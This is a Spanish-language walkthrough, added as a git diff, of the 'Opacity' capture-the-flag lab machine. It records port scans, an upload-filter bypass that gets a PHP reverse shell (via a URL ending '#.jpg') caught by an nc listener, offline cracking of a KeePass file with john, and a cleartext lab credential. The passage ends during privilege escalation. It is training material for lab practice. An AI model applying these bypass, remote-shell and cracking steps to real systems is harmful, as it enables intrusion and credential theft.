@@ -1,2 +1,203 @@
-# opacity walkthrough
+# Opacity walkthrough
 //Los cambios de ip en este walkthrough se deben a que he hecho la máquina en varios días.
+
+Comienzo con un escaneo de todos los puertos.
+
+sudo nmap -p- 10.129.137.93    
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-07-21 16:33 CEST
+Nmap scan report for 10.129.137.93
+Host is up (0.046s latency).
+Not shown: 65531 closed tcp ports (reset)
+PORT    STATE SERVICE
+22/tcp  open  ssh
+80/tcp  open  http
+139/tcp open  netbios-ssn
+445/tcp open  microsoft-ds
+
+Nmap done: 1 IP address (1 host up) scanned in 21.26 seconds
+
+Y continúo con uno -sVC para ver versiones y acabar con una enumeración sencilla.
+
+
+sudo nmap -sVC -p 22,80,139,445 10.129.137.93
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-07-21 16:35 CEST
+Nmap scan report for 10.129.137.93
+Host is up (0.13s latency).
+
+PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 24:7a:41:fb:43:19:c9:99:19:d3:50:ca:ee:c4:9c:32 (RSA)
+|   256 52:2d:b3:1c:20:8a:03:59:ba:bf:df:4b:10:80:81:4e (ECDSA)
+|_  256 46:f7:56:1f:f7:18:cc:33:b7:5a:4c:89:8c:54:2d:78 (ED25519)
+80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
+| http-title: Login
+|_Requested resource was login.php
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+139/tcp open  netbios-ssn Samba smbd 4.6.2
+445/tcp open  netbios-ssn Samba smbd 4.6.2
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_nbstat: NetBIOS name: , NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+| smb2-time: 
+|   date: 2026-07-21T14:35:14
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+|_clock-skew: -1s
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 13.51 seconds
+
+Busco alguna vulnerabilidad con searchsploit pero en principio nada.
+Ahora voy al puerto 80.
+
+En el puerto 80 hay una página de login, como indica el escaneo anterior. Antes de intentar algún ataque contra esta, sigo enumerando un poco.
+
+sudo dirsearch -u http://10.129.137.93:80
+/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
+  from pkg_resources import DistributionNotFound, VersionConflict
+
+  _|. _ _  _  _  _ _|_    v0.4.3
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
+
+Output File: /home/mksk/reports/http_10.129.137.93_80/_26-07-21_16-38-24.txt
+
+Target: http://10.129.137.93/
+
+[16:38:24] Starting: 
+[16:38:28] 403 -  278B  - /.ht_wsr.txt
+[16:38:28] 403 -  278B  - /.htaccess.bak1
+[16:38:28] 403 -  278B  - /.htaccess.orig
+[16:38:28] 403 -  278B  - /.htaccess.sample
+[16:38:28] 403 -  278B  - /.htaccess.save
+[16:38:28] 403 -  278B  - /.htaccess_orig
+[16:38:28] 403 -  278B  - /.htaccess_extra
+[16:38:28] 403 -  278B  - /.htaccess_sc
+[16:38:28] 403 -  278B  - /.htaccessBAK
+[16:38:28] 403 -  278B  - /.htaccessOLD2
+[16:38:28] 403 -  278B  - /.htaccessOLD
+[16:38:28] 403 -  278B  - /.htm
+[16:38:28] 403 -  278B  - /.html
+[16:38:28] 403 -  278B  - /.htpasswd_test
+[16:38:28] 403 -  278B  - /.htpasswds
+[16:38:28] 403 -  278B  - /.httr-oauth
+[16:38:29] 403 -  278B  - /.php
+[16:38:38] 301 -  314B  - /cloud  ->  http://10.129.137.93/cloud/
+[16:38:38] 200 -  393B  - /cloud/
+[16:38:39] 301 -  312B  - /css  ->  http://10.129.137.93/css/
+[16:38:45] 200 -  381B  - /login.php
+[16:38:52] 403 -  278B  - /server-status/
+[16:38:52] 403 -  278B  - /server-status
+
+Task Completed
+
+Encuentro la carpeta cloud/
+
+En la carpeta cloud hay un formulario para subir imágenes.
+Abro un servidor para poder subir imagénes.
+python3 -m http.server
+
+Intento subir la revshell de pentestmonkey. Al intentar varias subidas sin éxito, pruebo a subir una imagen.jpg y esta si que se sube.
+
+Renombro mi archivo a shell.php.jpg.
+
+http://192.168.131.65:8000/shell.php.jpg
+
+Tras probar varias formas, esta es la que me ha funcionado.
+
+10.129.137.93 - - [21/Jul/2026 16:56:02] "GET /shell.php HTTP/1.1" 200 -
+
+http://192.168.131.65:8000/shell.php#.jpg
+
+nc -lnvp 9003
+Listening on 0.0.0.0 9003
+Connection received on 10.129.137.93 56440
+Linux ip-10-129-137-93 5.15.0-138-generic #148~20.04.1-Ubuntu SMP Fri Mar 28 14:32:35 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
+ 14:56:05 up 23 min,  0 users,  load average: 0.05, 0.02, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+sh: 0: can't access tty; job control turned off
+$ 
+
+$ cat local.txt	
+cat: local.txt: Permission denied
+$ pwd
+/home/sysadmin
+$ 
+
+Encuentro la primera flag en el escritorio de sysadmin, pero no tengo permisos para leerla.
+Sigo buscando maneras de escalar privilegios.
+
+Tras otro rato buscando encuentro lo siguiente:
+
+$ cd /opt
+$ ls
+dataset.kdbx
+
+Un archivo de keepass.
+Abro un servidor en la máquina y me descargo el archivo.
+
+$ python3 -m http.server
+
+Lo paso a un hash con john.
+
+john-the-ripper.keepass2john /home/mksk/Descargas/dataset.kdbx > hash.txt
+
+Y lo crackeo.
+
+ john-the-ripper --wordlist=/home/mksk/wordlists/rockyou.txt hash.txt 
+Warning: detected hash type "KeePass", but the string is also recognized as "KeePass-opencl"
+Use the "--format=KeePass-opencl" option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 1 password hash (KeePass [AES/Argon2 512/512 AVX512F])
+Cost 1 (t (rounds)) is 100000 for all loaded hashes
+Cost 2 (m) is 0 for all loaded hashes
+Cost 3 (p) is 0 for all loaded hashes
+Cost 4 (KDF [0=Argon2d 2=Argon2id 3=AES]) is 3 for all loaded hashes
+Will run 16 OpenMP threads
+Note: Passwords longer than 41 [worst case UTF-8] to 124 [ASCII] rejected
+Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
+741852963        (dataset)     
+1g 0:00:00:00 DONE (2026-07-21 17:04) 6.250g/s 5500p/s 5500c/s 5500C/s chichi..david1
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+
+Abro el archivo y encuentro la clave y el user de sysadmin.
+
+sysadmin:Cl0udP4ss40p4city#8700
+
+Me logueo y consigo la primera flag.
+
+sysadmin@ip-10-129-137-93:~$ cat local.txt 
+66************************e2
+
+Ahora tengo que escalar privilegios. Antes, he visto el directorio scripts en este /home, pero no tenia permisos.
+Me meto y veo el script.
+
+sysadmin@ip-10-129-137-93:~/scripts$ cat script.php 
+<?php
+
+//Backup of scripts sysadmin folder
+require_once('lib/backup.inc.php');
+zipData('/home/sysadmin/scripts', '/var/backups/backup.zip');
+echo 'Successful', PHP_EOL;
+
+//Files scheduled removal
+$dir = "/var/www/html/cloud/images";
+if(file_exists($dir)){
+    $di = new RecursiveDirectoryIterator($dir, FilesystemIterator::SKIP_DOTS);
+    $ri = new RecursiveIteratorIterator($di, RecursiveIteratorIterator::CHILD_FIRST);
+    foreach ( $ri as $file ) {
+        $file->isDir() ?  rmdir($file) : unlink($file);
+    }
+}
+?>
